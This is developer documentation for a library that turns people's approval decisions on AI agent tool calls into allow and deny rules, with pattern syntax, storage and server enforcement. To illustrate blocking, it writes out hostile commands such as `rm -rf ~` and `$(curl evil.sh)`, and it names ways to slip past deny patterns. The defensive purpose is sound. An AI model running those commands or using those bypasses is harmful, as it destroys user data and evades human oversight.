Approval rules: what a person decided once, applied to the calls that follow. A decision is `allow-once`, `allow-session`, `allow-always`, `deny-once` or `deny-always`. A session or always decision leaves a rule over the tool (`tool`, a name or a glob such as `mcp_github_*`), narrowed by argument patterns when given (`args: { command: 'npm test*' }`, with dotted names for nested arguments) or by a test of your own (`when`). When an allow rule and a deny rule both match a call, the deny rule wins.

### The patterns

A pattern matches the whole argument, from its first character. `*` matches any run of characters except shell operators: `;`, `&`, `|`, `` ` ``, `<`, `>`, `$(` and line breaks. So `npm test*` allows `npm test -- --watch`, but not `npm test && rm -rf ~` or `npm test $(curl evil.sh)`. `**` matches anything, operators included. `?` matches one character, and `\` makes the next one literal. Numbers and booleans match as text. Arrays, objects and missing arguments match no allow pattern. A dotted name reads a key with that name as well as the nested argument, and when a call has both, an allow rule needs both to match. A tool pattern reads the tool's name the same way, except in a deny rule, where `*` and `?` match any character, since a name is no shell command: so `*` denies every tool, even one named after an ACP title such as ``Run `ls > out.txt` ``, which an allow rule's `*` leaves to a person.

A deny rule reads more, so that it still holds when a command is written another way. Its pattern also matches each command of a line on its own: the line split at `;`, `&`, `|`, `` ` ``, `$(`, `(`, `)` and line breaks, each command read from its first word past `NAME=value` settings, that word without its path, with quotes and `\` taken off and one space between words. A redirect goes with the word it names, so `2>/dev/null git push` and `git >out push` read as `git push`, and a line that ends in `\` is joined to the next. `nohup`, `command`, `time`, `if`, `!`, `find`'s `-exec` and the like pass on to the next word, and after `sudo`, `env`, `xargs`, `sh`, `bash` and the like any word can start the command, a quoted one read as a line of its own. So `git push*` denies `git status && git push`, `/usr/bin/git push`, `GIT_TRACE=1 git push`, `env git push` and `bash -c "git push"`, and not `echo git push`. The line is split inside quotes too, where `<` and `>` split it as well, so it also denies `git commit -m "wip; git push"`, and as any word after `sudo` or `timeout` may start the command, `sudo grep -rn "git push" docs` too. After a quote split that way, the next word may start a command: so `git push*` denies `FOO="a;b" git push`, and `rm*` denies `sed -i "s/a;b/c/" rm.txt`. A deny pattern matches an array when an item does, or the items joined by spaces do (`rm*` denies `['rm', '-rf', '~']`), and any other object, which it can't read. A deny rule holds, too, when its `when` throws, and when either reading of a dotted name matches. Matching from the first character keeps an allow rule narrow: `npm test*` allows neither ` npm test` nor `FOO=1 npm test`.

Each rule gets 20,000 matching steps, and 30 more for each character it reads, several times what a common pattern takes: so a rule such as `**PRIVATE KEY**` is decided on an argument of any length, and a pattern that takes more stops early. That bounds each rule, not a call, whose matching grows with the number of rules times the length of its arguments, and a deny rule reads more of them: a string up to twice, whole and then by command, and an array up to four times, each item and the items joined, each read both ways. A rule that stops before it can tell counts against the call: an allow rule allows nothing, and a deny rule denies, unless another deny rule covers the call. `match()` then reports that rule with `unchecked: true`, and neither `answer()` nor `toToolApproval` gives its own `reason`, which would say it matched: `toToolApproval`'s is "Denied: the arguments are too long to check against a rule: …".

Patterns are a convenience, not a sandbox. A deny pattern reads the common ways to chain or prefix a command, not every way a shell can write one: `git push*` denies `git push origin main` and the lines above, but not `git -C . push` or `git --git-dir=.git push`. `**git*push**` denies those too, and still misses other ways to write a push, such as an alias or a script. To keep a shell tool from running what it shouldn't for other people, keep an allowlist on the server that denies the rest (`toToolApproval(allowed, { otherwise: 'denied' })` for that tool's calls), or check each command with a real shell parser, in a server rule's `when`.

### What it does

`decide(request, decision, { reason, input, args })` records a person's decision, and the rule it leaves. `answer(request)` answers from the rules when one covers the call, recorded as decided by that rule. Asked again about a request it answered or a person decided, it gives the same outcome, as long as the tool and the arguments are the ones answered or the edit the person approved: another call that comes with the same id is decided again. `match`, `addRule`, `removeRule` and `clearSession` work on the rules directly. `onAudit` receives every decision, with who made it (a person or a rule), the rule, the reason and any edited arguments, as well as every rule added or removed and every session cleared.

### Where rules are kept

Session rules stay in memory until the page reloads or `clearSession()` runs. `always` rules go to `storage`: by default in memory, `webStorageRules()` for `localStorage`, or your own `{ load, save }`, which may be async. A rule with a `when` is never saved: `when` is code, and the rule would load without it, covering more calls. It holds until the page reloads, and a default with a `when` is back on each load, in place of a copy an earlier version saved without it. Rules are loaded after the first render, so a server render and the hydrating client agree. A call that arrives before they load is shown to a person. A rule added or removed before then, by a person's decision or by your app, goes over the saved rules once they load, and is saved with them: saving it sooner would replace them.

### Default rules

`defaultRules` are the rules a person starts with, such as allowing reads. On a first visit, with nothing saved, they are the rules. An `always` default the person removes stays removed on later visits, and a default your app adds in a later version still appears. `webStorageRules()` keeps the removed ids under `<key>:removed-defaults`. A storage of your own keeps them with the optional `loadRemovedDefaults()` and `saveRemovedDefaults(ids)`; without these, a removed default comes back on the next load. Adding a rule with a removed default's id, as a "Reset" button would, brings it back. A `session` default is a session rule: it comes back with each page load.

### On the server

The same rules, as AI SDK 7's `toolApproval`: `streamText({ toolApproval: toToolApproval(rules) })` approves or denies a call a rule covers, and asks a person about the rest. The SDK checks it again on an approved call before running it, with edited arguments too. It runs edited arguments, which `setToolInput` puts in the messages, through the tool's schema first (and `experimental_refineToolInput`, when set), and runs only an edit that comes out unchanged: keep the fields the schema fills in, such as a zod `.default()` (the card starts an edit from the input it shows, defaults included), and use transforms that give the same result when run twice. Rules a client sends are the choices of the person using it, so apply them to that person's runs only. Keep rules that protect other people on the server.

Keep the rules off a tool with no `execute`, such as a `review_changes` the page answers with a `DiffReview`: the review is the approval. A card for it has nothing to run. Approved, the call never gets a result: the review never shows, and recent AI SDK 7 releases end the run with `AI_MissingToolResultsError`. The routes below return `'not-applicable'` for it, and the rules decide the other tools.

A call a rule decides carries a reason, which the approval keeps as `approval.reason`: by default "Allowed by a rule: …" or "Denied by a rule: …", with the rule in words. When the server's rules and the person's both decide, give each set its own `reason`, so the page can tell whose rule it was. The server's rules go first, and `otherwise: 'not-applicable'` hands the calls they don't cover to the person's:

```ts
const server = toToolApproval(SERVER_RULES, {
  otherwise: 'not-applicable',
  reason: (match) =>
    `${match.effect === 'allow' ? 'Allowed' : 'Denied'} by the server's rule: ${describeRule(match.rule)}`,
});
const yours = toToolApproval(rules);

streamText({
  // model, messages, tools…
  toolApproval: (options) => {
    // No execute: the page answers it with a DiffReview, which is the approval.
    if (options.toolCall.toolName === 'review_changes') return 'not-applicable';
    const decided = server(options);
    return decided === 'not-applicable' ? yours(options) : decided;
  },
});
```

`reason` gets the match: `effect` and the `rule`, with the rule's own `reason` if it has one, and `unchecked: true` when a deny rule stopped before it could tell ([the patterns](/docs/components/use-approval-policy#the-patterns)), so its own `reason` doesn't apply. It is not called for a call no rule covers, which gets `otherwise`.

### AG-UI and ACP

With `useAgUiAgent`, an approval's resume payload is `{ approved, reason?, input? }`. For the Agent Client Protocol's `session/request_permission`:

- `decisionsFromAcpOptions(request.options)` gives the choices to offer: one per kind the agent sent exactly one option of (`allow_once`, `allow_always`, `reject_once`, `reject_always`), and Deny whenever it sent a `reject_once`.
- `toAcpPermissionResponse(decision, request.options)` answers with the agent's one option of the same kind, and cancels the request when there is none or several.
- `fromAcpPermissionRequest(request)` turns the request into the card's.

A kind the agent sent several options of is not offered, and `toAcpPermissionResponse` cancels rather than pick one: they grant different things. Claude Code's ExitPlanMode sends up to three `allow_always` options, one of them "Yes, clear context (26% used) and use auto mode", so its card offers Approve and Deny, with no Always. Deny is the exception: a "no" grants nothing, so with several `reject_once` options it answers the agent's first one. When `decisionsFromAcpOptions` returns no decision, as for an agent that sent only several `allow_always` options, no card can answer it: reply `{ outcome: { outcome: 'cancelled' } }` right away instead of rendering one.

When the agent sends one `allow_always` option, Always answers it, whatever it grants: "Yes, and use auto mode" on Claude Code's ExitPlanMode with no plan and bypass mode off, or "Yes, allow all edits during this session" on an edit. To say what it grants, put the option's `name` where text wraps: in the card's description, and in the line the card shows once decided. Leave the button's label short. Card buttons don't wrap, and a name such as codex-acp's "Yes, and don't ask again for commands that start with …" on Always pushes Approve and Deny off a phone-width card.

```tsx
const decisions = decisionsFromAcpOptions(request.options);
// Always is offered only when the agent sent one allow_always option.
const always = decisions.includes('allow-always')
  ? request.options.find((o) => o.kind === 'allow_always')?.name
  : undefined;

<ApprovalCard
  decisions={decisions}
  description={always ? `Always: ${always}` : undefined}
  labels={{ approvalCard: { resolved: { 'allow-always': always } } }}
  // ACP's response has no field for a reason.
  allowReason={false}
  // …
/>;
```

ACP has no session option, so `allow-session` answers `allow_once` and leaves the session rule on the client. These helpers are types and functions only, with no ACP package to install.

### Sending a person's rules with each request

For the route to decide with the person's own rules, the page sends them with every request. The transport is made once and the rules change between requests, so `body` is a function, called as each request goes out. `policy.getRules()` returns the rules as they are at that moment, as plain data. It is the same function for the policy's life, so the transport is still made once. A "For this session" rule is in it as soon as the person chooses it, so the rule goes out with the request that carries that approval, and the server decides the run's next calls with it. Reading a ref in `body` would work too, but `react-hooks/refs` reports it.

The page:

```tsx
'use client';

import { useChat } from '@ai-sdk/react';
import { DefaultChatTransport, lastAssistantMessageIsCompleteWithApprovalResponses } from 'ai';
import { useMemo } from 'react';
import { AgentMessage, useApprovalPolicy, webStorageRules } from 'signoff-ui';

const storage = webStorageRules(); // once, outside the component

export function Run() {
  const policy = useApprovalPolicy({ storage });
  const { getRules } = policy;
  const transport = useMemo(
    () => new DefaultChatTransport({ api: '/api/chat', body: () => ({ rules: getRules() }) }),
    [getRules],
  );
  const { messages, addToolApprovalResponse } = useChat({
    transport,
    sendAutomaticallyWhen: lastAssistantMessageIsCompleteWithApprovalResponses,
  });
  return messages.map((m) => (
    <AgentMessage key={m.id} message={m} approvalPolicy={policy} onToolApproval={addToolApprovalResponse} />
  ));
}
```

The route, `app/api/chat/route.ts`:

```ts
import { convertToModelMessages, stepCountIs, streamText, type UIMessage } from 'ai';
import { parseApprovalRules, toToolApproval } from 'signoff-ui/core';

export async function POST(req: Request) {
  const { messages, rules }: { messages: UIMessage[]; rules?: unknown } = await req.json();
  // This person's rules, for this person's run.
  const yours = toToolApproval(parseApprovalRules(rules));
  const result = streamText({
    model,
    messages: await convertToModelMessages(messages, { tools }),
    tools,
    // Not on review_changes: it has no execute, and the page answers it.
    toolApproval: (options) => (options.toolCall.toolName === 'review_changes' ? 'not-applicable' : yours(options)),
    stopWhen: stepCountIs(10),
  });
  return result.toUIMessageStreamResponse({ originalMessages: messages });
}
```

### The server's rules win

Rules the server keeps for everyone, such as one that denies `git push`, go first. Make them with `toToolApproval(SERVER_RULES, { otherwise: 'not-applicable' })`, and ask the person's `toToolApproval(parseApprovalRules(rules))` only when that returns `'not-applicable'`. A rule a client sends then can't approve a call the server's rules deny. It can approve one their patterns miss, such as `git -C . push` past a `git push*` deny rule ([the patterns](/docs/components/use-approval-policy#the-patterns)): a rule that protects other people is an allowlist on the server, with `otherwise: 'denied'` for that tool's calls, or a check with a real shell parser.

The route gets whatever the client sent, so `parseApprovalRules` checks it: each field and its type, at most 100 rules, 20 argument patterns in a rule, 500 characters in a string, and three `*` in a pattern, `**` counting as one. Matching takes time in proportion to the argument's length times the pattern's, whatever the number of `*`, and each rule's matching is bounded at about 30 steps for each character it reads ([the patterns](/docs/components/use-approval-policy#the-patterns)). So a call's matching grows with the number of rules times the length of its arguments: 100 rules of 500 characters, built to take the most steps for each character, take about 0.3 seconds on one plain string of 20,000 characters and 5 seconds on 400,000 (Node 24, Apple M1 Max). A deny rule reads a string up to twice, whole and then by command, and an array up to four times: on 20,000 and 400,000 characters with a `;` in every 1,000, 100 such deny rules take about 0.5 and 10 seconds, and on an array of two such strings about 1.7 and 20 seconds. On a route that takes rules from the client, cap the length of the arguments they read, such as with `.max()` on the strings and arrays of the tool's input schema: the AI SDK asks `toolApproval` only about a call that passes it. Other limits go in the second argument, such as `parseApprovalRules(rules, { maxWildcards: 1 })`. A rule that fails a check is left out.

A rule the server doesn't get still holds on the page: the server asks, and the policy answers without showing anyone a card. That covers rules with a `when`, which `getRules()` leaves out: `when` is code, and without it the rule would cover more calls than it does. A deny rule left out would lose to an allow rule the server has, so it takes the allow rules it could overrule with it, and the server asks about those calls instead of approving them. `getRules()` leaves out the allow rules on the tools a deny rule with a `when` covers. `parseApprovalRules` does the same for a deny rule that fails a check, and keeps no allow rule when that rule's tool can't be read, when the rule comes after the first 100, or when the deny rules it leaves out name more than 10 tools. `toPlainRules(rules)` does what `getRules()` does, for rules kept outside the hook.
